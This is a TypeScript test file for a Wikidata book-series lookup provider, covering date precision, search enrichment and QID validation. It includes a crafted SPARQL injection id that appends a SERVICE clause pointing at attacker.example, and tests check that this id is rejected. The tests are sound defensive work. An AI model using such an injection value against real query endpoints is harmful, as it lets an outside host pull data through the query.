import { http, HttpResponse } from "msw";
import { describe, expect, it } from "vitest";
import { server } from "../../tests/msw-server";
import fixture from "../../tests/fixtures/wikidata-series-entries.json";
import searchFixture from "../../tests/fixtures/wikidata-search.json";
import enrichmentFixture from "../../tests/fixtures/wikidata-search-enrichment.json";
import {
  buildValuesClause,
  candidatesFromSearchResponse,
  isValidQid,
  precisionFromWikidata,
  wikidataProvider,
} from "./wikidata";

const ENDPOINT = "https://query.wikidata.org/sparql";
const SEARCH_ENDPOINT = "https://www.wikidata.org/w/api.php";

// A crafted id that closes the BIND clause this file used to splice
// externalId into unguarded, and appends a SERVICE clause pointing at an
// attacker-chosen endpoint. Shared across the injection tests below so a
// SPARQL syntax detail does not have to be re-derived per test.
const INJECTION_QID = 'Q1 . } SERVICE <https://attacker.example/sparql> { ?s ?p ?o';

describe("precisionFromWikidata", () => {
  it("maps 11 to day, 10 to month, 9 to year", () => {
    expect(precisionFromWikidata("11")).toBe("day");
    expect(precisionFromWikidata("10")).toBe("month");
    expect(precisionFromWikidata("9")).toBe("year");
  });

  it("defaults to year, the coarsest value, when the precision is missing", () => {
    expect(precisionFromWikidata(undefined)).toBe("year");
  });

  it("defaults decade (8) and century (7) to year rather than day", () => {
    expect(precisionFromWikidata("8")).toBe("year");
    expect(precisionFromWikidata("7")).toBe("year");
  });

  it("defaults a malformed precision code to year", () => {
    expect(precisionFromWikidata("not-a-code")).toBe("year");
  });
});

describe("wikidataProvider", () => {
  it("maps bindings to ProviderBook with ordinals", async () => {
    server.use(http.get(ENDPOINT, () => HttpResponse.json(fixture)));
    const entries = await wikidataProvider.getSeriesEntries("Q45875");

    expect(entries[0]).toMatchObject({
      provider: "wikidata",
      externalId: "Q1234",
      title: "A Dance with Dragons",
      seriesPosition: 5,
      releaseDate: "2011-07-12",
      datePrecision: "day",
    });
  });

  it("yields an entry with no date for an announced book", async () => {
    server.use(http.get(ENDPOINT, () => HttpResponse.json(fixture)));
    const entries = await wikidataProvider.getSeriesEntries("Q45875");

    expect(entries[1]).toMatchObject({
      externalId: "Q5678",
      title: "The Winds of Winter",
      seriesPosition: 6,
    });
    expect(entries[1].releaseDate).toBeUndefined();
    expect(entries[1].datePrecision).toBeUndefined();
  });

  it("populates seriesName on every discovered series entry", async () => {
    server.use(http.get(ENDPOINT, () => HttpResponse.json(fixture)));
    const entries = await wikidataProvider.getSeriesEntries("Q45875");

    expect(entries).toHaveLength(2);
    for (const entry of entries) {
      expect(entry.seriesName).toBe("A Song of Ice and Fire");
    }
  });

  it("returns an empty array when the endpoint errors", async () => {
    server.use(http.get(ENDPOINT, () => new HttpResponse(null, { status: 429 })));
    await expect(wikidataProvider.getSeriesEntries("Q1")).resolves.toEqual([]);
  });

  it("returns an empty array when bindings is not an array", async () => {
    server.use(
      http.get(ENDPOINT, () =>
        HttpResponse.json({ results: { bindings: { not: "an array" } } }),
      ),
    );
    await expect(wikidataProvider.getSeriesEntries("Q1")).resolves.toEqual([]);
  });
});

describe("buildValuesClause", () => {
  it("joins QIDs into a SPARQL VALUES list, each prefixed with wd:", () => {
    expect(buildValuesClause(["Q1", "Q2", "Q3"])).toBe("wd:Q1 wd:Q2 wd:Q3");
  });

  it("returns an empty string for an empty candidate list", () => {
    expect(buildValuesClause([])).toBe("");
  });
});

describe("candidatesFromSearchResponse", () => {
  it("maps wbsearchentities hits to qid/label candidates", () => {
    expect(candidatesFromSearchResponse(searchFixture)).toEqual([
      { qid: "Q2136877", label: "The Way of Kings" },
      { qid: "Q9999999", label: "Stormlight Archive, Book Six" },
    ]);
  });

  it("returns an empty array when the response is not a record", () => {
    expect(candidatesFromSearchResponse(null)).toEqual([]);
    expect(candidatesFromSearchResponse("nope")).toEqual([]);
  });

  it("returns an empty array when search is not an array", () => {
    expect(candidatesFromSearchResponse({ search: "nope" })).toEqual([]);
  });

  it("skips hits missing an id or label", () => {
    expect(
      candidatesFromSearchResponse({
        search: [{ id: "Q1" }, { label: "No id" }, { id: "Q2", label: "Has both" }],
      }),
    ).toEqual([{ qid: "Q2", label: "Has both" }]);
  });
});

describe("wikidataProvider.searchBooks", () => {
  it("uses wbsearchentities candidates then enriches them via a batched SPARQL query", async () => {
    server.use(
      http.get(SEARCH_ENDPOINT, () => HttpResponse.json(searchFixture)),
      http.get(ENDPOINT, () => HttpResponse.json(enrichmentFixture)),
    );

    const results = await wikidataProvider.searchBooks("the way of kings");

    expect(results).toHaveLength(2);
    expect(results[0]).toMatchObject({
      provider: "wikidata",
      externalId: "Q2136877",
      title: "The Way of Kings",
      seriesName: "The Stormlight Archive",
      seriesExternalId: "Q477675",
      seriesPosition: 1,
      releaseDate: "2010-08-31",
      datePrecision: "day",
    });
  });

  it("yields a candidate with no date for an announced book that only has an ordinal", async () => {
    server.use(
      http.get(SEARCH_ENDPOINT, () => HttpResponse.json(searchFixture)),
      http.get(ENDPOINT, () => HttpResponse.json(enrichmentFixture)),
    );

    const results = await wikidataProvider.searchBooks("the way of kings");

    const announced = results.find((r) => r.externalId === "Q9999999");
    expect(announced).toMatchObject({
      title: "Stormlight Archive, Book Six",
      seriesPosition: 6,
    });
    expect(announced?.releaseDate).toBeUndefined();
    expect(announced?.datePrecision).toBeUndefined();
  });

  it("returns an empty array when wbsearchentities errors", async () => {
    server.use(http.get(SEARCH_ENDPOINT, () => new HttpResponse(null, { status: 429 })));
    await expect(wikidataProvider.searchBooks("way of kings")).resolves.toEqual([]);
  });

  it("returns an empty array when wbsearchentities finds no candidates", async () => {
    server.use(
      http.get(SEARCH_ENDPOINT, () =>
        HttpResponse.json({ searchinfo: { search: "zzz" }, search: [], success: 1 }),
      ),
    );
    await expect(wikidataProvider.searchBooks("zzz")).resolves.toEqual([]);
  });

  it("still returns titles when the enrichment query errors", async () => {
    server.use(
      http.get(SEARCH_ENDPOINT, () => HttpResponse.json(searchFixture)),
      http.get(ENDPOINT, () => new HttpResponse(null, { status: 429 })),
    );

    const results = await wikidataProvider.searchBooks("the way of kings");

    expect(results).toHaveLength(2);
    expect(results[0].title).toBe("The Way of Kings");
    expect(results[0].seriesName).toBeUndefined();
    expect(results[0].releaseDate).toBeUndefined();
  });

  it("still returns titles when enrichment bindings is not an array", async () => {
    server.use(
      http.get(SEARCH_ENDPOINT, () => HttpResponse.json(searchFixture)),
      http.get(ENDPOINT, () =>
        HttpResponse.json({ results: { bindings: { not: "an array" } } }),
      ),
    );

    const results = await wikidataProvider.searchBooks("the way of kings");

    expect(results).toHaveLength(2);
    expect(results[0].seriesName).toBeUndefined();
  });
});

describe("isValidQid", () => {
  it("accepts Q followed by digits", () => {
    expect(isValidQid("Q1")).toBe(true);
    expect(isValidQid("Q45875")).toBe(true);
    expect(isValidQid("Q123456789")).toBe(true);
  });

  it("rejects a bare number, a lowercase q, and an empty string", () => {
    expect(isValidQid("45875")).toBe(false);
    expect(isValidQid("q45875")).toBe(false);
    expect(isValidQid("")).toBe(false);
  });

  it("rejects an id that would close the SPARQL BIND clause", () => {
    expect(isValidQid(INJECTION_QID)).toBe(false);
    expect(isValidQid("Q1 . }")).toBe(false);
    expect(isValidQid("Q1; DROP")).toBe(false);
  });
});

// A/7 (docs/audits/2026-07-30-full-audit.md): externalId reaches these three
// methods straight from an anonymous POST /api/track body (via
// discoverSeriesEntries -> getSeriesEntriesFromAll), so a crafted value
// must never reach the SPARQL string. Each test proves both that no
// network call is attempted and that the method degrades to an empty
// result instead of throwing, so one malformed row does not fail a refresh
// for every other book in the same slice.
describe("SPARQL injection guard (A7)", () => {
  it("getSeriesEntries makes no network call and returns [] for a malformed id", async () => {
    let called = false;
    server.use(
      http.get(ENDPOINT, () => {
        called = true;
        return HttpResponse.json(fixture);
      }),
    );

    const entries = await wikidataProvider.getSeriesEntries(INJECTION_QID);

    expect(entries).toEqual([]);
    expect(called).toBe(false);
  });

  it("getBook makes no network call and returns null for a malformed id", async () => {
    let called = false;
    server.use(
      http.get(ENDPOINT, () => {
        called = true;
        return HttpResponse.json({ results: { bindings: [] } });
      }),
    );

    const book = await wikidataProvider.getBook(INJECTION_QID);

    expect(book).toBeNull();
    expect(called).toBe(false);
  });

  it("getSeries makes no network call and returns null for a malformed id", async () => {
    let called = false;
    server.use(
      http.get(ENDPOINT, () => {
        called = true;
        return HttpResponse.json({ results: { bindings: [] } });
      }),
    );

    const series = await wikidataProvider.getSeries(INJECTION_QID);

    expect(series).toBeNull();
    expect(called).toBe(false);
  });

  it("still serves a well-formed QID through each guarded method", async () => {
    server.use(http.get(ENDPOINT, () => HttpResponse.json(fixture)));

    const entries = await wikidataProvider.getSeriesEntries("Q45875");
    expect(entries.length).toBeGreaterThan(0);
  });
});
